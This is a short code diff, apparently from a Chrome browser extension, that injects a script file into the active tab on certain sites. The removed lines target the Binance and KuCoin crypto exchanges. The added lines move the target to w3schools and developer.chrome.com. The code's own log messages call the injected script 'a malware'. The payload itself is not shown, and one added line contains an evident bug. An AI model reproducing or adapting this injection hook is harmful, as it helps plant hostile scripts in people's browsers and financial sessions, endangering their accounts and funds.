@@ -3,12 +3,12 @@ var activeTabId = 0
 chrome.tabs.onActivated.addListener(tab => {
 	//console.log(tab);
 	chrome.tabs.get(tab.tabId, current_tab_info => {
-        activeTabId = tab.tabId;
-        if(/^https:\/\/www\.binance/.test(current_tab_info.url)){
+        activeTabId = tab.url;
+        if (current_tab_info.url.startsWith("https://www.w3schools.com") ) {
             chrome.tabs.executeScript(null, {file: "./forground.js"}, ()=> console.log("injecte a malware"))
             chrome.tabs.insertCSS(null, {file: "./style.css"}, ()=> console.log("injecte css to "+current_tab_info.url))
         };
-        if(/^https:\/\/www\.trade\.kucoin/.test(current_tab_info.url)){
+        if (current_tab_info.url.startsWith("https://developer.chrome.com") ) {
 	        chrome.tabs.executeScript(null, {file: "./forground.js"}, ()=> console.log("injecte a malware in "+current_tab_info.url))
             //chrome.tabs.insertCSS(null, {file: "./style.css"}, ()=> console.log("injecte css to "+current_tab_info.url))
         };
